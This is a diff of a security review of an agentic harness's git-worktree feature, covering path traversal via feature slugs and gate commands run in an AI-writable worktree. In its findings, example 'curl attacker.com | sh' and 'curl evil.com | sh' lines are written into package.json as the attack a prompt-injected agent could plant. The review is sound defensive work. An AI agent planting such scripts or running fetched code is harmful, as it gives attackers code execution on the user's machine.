@@ -1,100 +1,111 @@
-# Security Review: git-worktree-isolation — runGateInline cwd injection
+# Security Review: git-worktree-isolation — Gate commands receive worktree cwd
 
-**Overall Verdict: PASS** (2 warnings, 1 suggestion — no criticals)
-
-Reviewed against final code state: commits `75945b5` (−b→−B, `.toLowerCase()`) and `2bc244d`
-(runGateInline cwd parameter).
+**Overall Verdict: PASS** (0 criticals, 2 warnings, 1 suggestion)
 
 ---
 
-## Files Read
+## Files Actually Read
 
-- `bin/lib/run.mjs` lines 1–30 (imports), 50–176 (runGateInline + worktree helpers),
-  375–400 (detectGateCommand), 940–950 (worktree wiring in _runSingleFeature)
-- `test/worktree.test.mjs` (all 264 lines)
+- `bin/lib/run.mjs` lines 45–176 (`runGateInline`, worktree helpers)
+- `bin/lib/run.mjs` lines 376–400 (`detectGateCommand`)
+- `bin/lib/run.mjs` lines 760–850 (`featureName` derivation, `detectGateCommand` call site)
+- `bin/lib/run.mjs` lines 940–955 (worktree creation, `cwd` reassignment)
+- `bin/lib/run.mjs` lines 1144–1165 (`runGateInline` call site, git commit)
+- `test/worktree.test.mjs` lines 220–264 (wiring + dispatch tests)
 - `.team/features/git-worktree-isolation/tasks/task-3/handshake.json`
-- git log / git show for commits 75945b5 and 2bc244d
 
 ---
 
 ## Threat Model
 
-**Internal agentic tool** — user launches the harness, AI agents build code inside
-git worktrees, the harness runs tests and reviews. The adversary in scope is:
+Internal agentic harness. User launches the harness; AI agents write code inside git
+worktrees; the harness runs tests as a quality gate. Realistic adversaries:
 
-1. A compromised or prompt-injected AI agent that writes malicious files into the
-   worktree before the gate runs.
-2. A malformed feature name (from STATE.json or user input) that traverses the
-   filesystem.
-3. An untrusted feature name from a shared `.team/` configuration.
+1. A prompt-injected AI agent that writes malicious code into the worktree before the
+   gate runs (worktree is fully writable by the agent).
+2. A malformed feature name from CLI or roadmap that traverses the filesystem.
 
-Enterprise-level CSRF/XSS threats are out of scope for this codebase.
+CSRF, XSS, and enterprise-grade attacks are out of scope for this local CLI tool.
 
 ---
 
 ## Findings
 
-🟡 `bin/lib/run.mjs:161` — Path traversal: `slug` is used raw in
-`join(mainCwd, ".team", "worktrees", slug)` but is never sanitized for path use.
-`slugToBranch(slug)` strips path separators and `..` components, but its output is
-used **only** for the git branch name (line 162) — not for the path. `path.join`
-resolves `..` segments: `createWorktreeIfNeeded("../../evil", "/repo")` produces
-`worktreePath = /repo/evil`, escaping `.team/worktrees/`. Fix: add a
-`resolve`-then-`startsWith` guard after line 161, e.g.:
-`if (!worktreePath.startsWith(join(mainCwd, ".team", "worktrees"))) throw new Error("unsafe slug");`
+🟡 `bin/lib/run.mjs:161` — `createWorktreeIfNeeded` uses the raw `slug` in
+`join(mainCwd, ".team", "worktrees", slug)` without a bounds check. The current
+call site at line 947 sanitizes `featureName` to `[a-z0-9-]+` before passing it, so
+the production path is safe. However the function is `export`ed with no documented
+precondition, and `slugToBranch`'s output (sanitized) is used only for the branch
+name — not the path — creating a visible asymmetry. A future caller that skips
+sanitization could escape `.team/worktrees/` via `path.join` resolving `..`
+segments. Fix: add a two-line bounds check after line 161:
+`const resolved = resolve(worktreePath); if (!resolved.startsWith(join(mainCwd, ".team", "worktrees"))) throw new Error("unsafe slug: " + slug);`
 
-🟡 `bin/lib/run.mjs:58` + `bin/lib/run.mjs:388–394` — Shell injection from
-AI-written worktree files: `detectGateCommand(cwd)` now reads from the **worktree**
-directory (cwd = worktreePath since the change). It reads `package.json
-scripts.test` verbatim and returns it as `cmd`. That `cmd` is then executed via
-`execSync(cmd, { shell: true })` — the shell interprets it. An AI agent that writes
-`"scripts": { "test": "curl attacker.com | sh" }` into the worktree's
-`package.json` before the gate runs would achieve arbitrary code execution. This is
-a realistic prompt-injection path in agentic systems. Mitigations to consider:
-(a) allowlist gate commands to `npm test`, `npm run check`, `npm run build`,
-`cargo test`, `python -m pytest`; or (b) detect the gate command from the **main**
-project (mainCwd) rather than the worktree (where the AI writes).
+🟡 `bin/lib/run.mjs:58` — Gate command is executed inside the AI-writable worktree
+(`execSync(cmd, { cwd: worktreePath, shell: true })`). The `cmd` is correctly
+detected from `mainCwd` (line 839 — confirmed, not the worktree), so the command
+string itself is safe. However when `cmd = "npm test"`, npm resolves `package.json`
+from `cwd` (the worktree), and the AI can modify `scripts.test` in the worktree's
+`package.json`. A prompt-injected AI writing `"scripts": {"test": "curl evil.com | sh"}` achieves arbitrary code execution on the next gate run. Mitigation options:
+(a) detect the gate command AND read `package.json` from `mainCwd` at execution time
+(not just detection time), or (b) add an allowlist check: reject `cmd` values
+containing shell operators (`|`, `;`, `&&` unless they match known-safe patterns like
+`npm test && npm run build`).
 
-🔵 `bin/lib/run.mjs:161–162` — Sanitization asymmetry: `slugToBranch` output
-(sanitized) is used for the branch name while the raw `slug` is used for the path.
-This looks like the slug is sanitized for both uses, but it isn't. Add a comment
-noting that `worktreePath` uses the raw slug intentionally (and pair it with the
-bounds check above) to prevent future maintainers from removing `slugToBranch`
-thinking it's redundant.
+🔵 Prior review errata — `.team/features/git-worktree-isolation/tasks/task-3/security-eval.md`:
+The prior security-eval.md states "`detectGateCommand(cwd)` now reads from the
+**worktree** directory (cwd = worktreePath since the change)." This is incorrect.
+Line 839 calls `detectGateCommand(mainCwd)` **before** `cwd` is reassigned to
+`worktreePath` at line 948. The command is detected from the main repo; the risk is
+that it is **executed** in the worktree (where npm reads the worktree's
+`package.json`). The prior finding is correct in severity but wrong in mechanism.
+Update the prior eval to avoid confusing future maintainers.
 
 ---
 
 ## Criterion Results
 
-### 1. Input Validation — FAIL (warning-level)
+### 1. Input Validation — PARTIAL PASS
 
-- `runGateInline` cwd param (line 52): not validated before use. Low severity since
-  callers are internal and the default is `process.cwd()`. No test exercises an
-  invalid cwd.
-- `createWorktreeIfNeeded` slug (line 161): used raw for path construction without
-  sanitization or bounds check. Exploitation requires controlling a feature name,
-  which is realistic via STATE.json or user input. **No test exercises a traversal
-  slug.**
+- `featureName` derivation (lines 767–771, 820): sanitized to `[a-z0-9-]+` before
+  reaching `createWorktreeIfNeeded`. No traversal possible via the current call site.
+- `createWorktreeIfNeeded(slug)` exported function: no internal bounds check. Safe
+  today via caller discipline; not safe by function contract.
+- `taskId` in artifact paths: derived from task plan (`"task-1"`, `"task-2"`, …), no
+  user-controlled input.
 
-### 2. Shell / Command Injection — FAIL (warning-level)
+### 2. Shell / Command Injection — PARTIAL PASS
 
-- `execSync(cmd, { shell: true })` (line 58): intentional — `&&` in multi-step gate
-  commands requires a shell. But `cmd` is now sourced from AI-written worktree
-  files, which is a new injection surface introduced by this feature.
-- Pre-existing commands in `detectGateCommand` are safe constants; the risk is from
-  `package.json` content written by the agent.
+- `detectGateCommand` (line 839) reads from `mainCwd` — correct, the AI cannot
+  modify main-repo files from the worktree.
+- `execSync(cmd, { shell: true })` (line 58): shell is required for `&&`-joined
+  commands. `cmd` content is safe at detection time.
+- **Execution context risk**: `npm test` in the worktree reads the worktree's
+  `package.json`. The AI has full write access to the worktree. A prompt-injected AI
+  can make `npm test` run arbitrary code. This is a realistic prompt-injection path.
+- `git add`, `git commit`, `git worktree add/remove` all use `execFileSync` with
+  array args — no shell injection possible.
 
 ### 3. Secrets / Credentials — PASS
 
-No secrets, tokens, or credentials are introduced, stored, or passed by the changed
-code. Worktree paths and branch names are not sensitive.
+No credentials, tokens, or environment secrets are introduced or handled by the
+changed code. Worktree paths and branch names are not sensitive.
 
-### 4. Access Control / Filesystem Isolation — PARTIAL PASS
+### 4. Filesystem Isolation — PASS (with caveat)
 
-The worktree is isolated in `.team/worktrees/{slug}`. The isolation boundary holds
-for clean slugs. It fails for traversal slugs (finding 1). The `--force` flag in
-`removeWorktree` (line 174) is scoped to git worktree removal, not arbitrary FS
-deletion. Auto-commit uses array args without `shell: true` (line 1156) — safe.
+The worktree is scoped to `.team/worktrees/{featureName}`. The featureName sanitizer
+prevents traversal at the call site. The `--force` flag in `removeWorktree` is scoped
+to `git worktree remove`, not arbitrary filesystem deletion. `mkdirSync` paths are
+fully derived from sanitized inputs. Artifact write paths (`featureDir/tasks/taskId`)
+are safe.
+
+### 5. Denial of Service / Resource Exhaustion — PASS
+
+- `execSync` timeout is 120 000 ms (2 min) — prevents infinite-loop gate hangs.
+- `stdout.slice(0, 4096)` and `stderr.slice(0, 4096)` before STATE.json writes —
+  prevents unbounded state growth.
+- Full stdout written to `test-output.txt` artifact (line 87) with no length cap,
+  but this is intentional for test reporting and is filesystem-local.
 
 ---
 
@@ -102,22 +113,26 @@ deletion. Auto-commit uses array args without `shell: true` (line 1156) — safe
 
 | Scenario | Covered? |
 |---|---|
-| `runGateInline` uses provided cwd (not process.cwd()) | ✓ line 181 |
+| `runGateInline` uses provided cwd (not `process.cwd()`) | ✓ worktree.test.mjs:180 |
+| `_runSingleFeature` passes `worktreePath` as cwd to `runGateInline` | ✓ worktree.test.mjs:223 (source assertion) |
 | Traversal slug escapes `.team/worktrees/` | ✗ no test |
-| Gate cmd from AI-written `package.json` is untrusted | ✗ no test |
-| `slugToBranch` path vs branch name asymmetry | ✗ no test |
+| `npm test` in worktree reads worktree `package.json` (exec context) | ✗ no test |
+| `createWorktreeIfNeeded` bounds-check on slug | ✗ no test |
 
 ---
 
 ## Summary
 
-The cwd injection is correctly wired and tested. The two 🟡 findings are:
+The core wiring is correct and verified: `runGateInline` receives `cwd = worktreePath`
+from `_runSingleFeature`, and `detectGateCommand` reads from `mainCwd` (not the
+worktree). No critical security issues block merge.
 
-1. **Path traversal** — slug used raw in path; `slugToBranch` only protects branch
-   names. A 2-line fix + 1 test closes this.
-2. **AI-controlled gate command** — `detectGateCommand` now reads from the AI's
-   worktree; shell injection is possible via `package.json scripts.test`. Consider
-   locking gate command detection to mainCwd or allowlisting.
+Two 🟡 backlog items:
+1. **Path traversal guard** on `createWorktreeIfNeeded` — 2 lines of code + 1 test,
+   closes a latent risk on the exported API.
+2. **Gate execution context** — `npm test` runs in the AI-writable worktree; a
+   prompt-injected AI can hijack `scripts.test` for code execution. Locking gate
+   detection and execution to `mainCwd` (or an allowlist) closes this.
 
-Neither blocks merge for an internal tool with a cooperative-AI threat model, but
-both should be tracked in the backlog.
+Neither blocks merge for an internal tool with a cooperative-AI baseline, but both
+should enter the backlog before this feature is used with untrusted AI models.
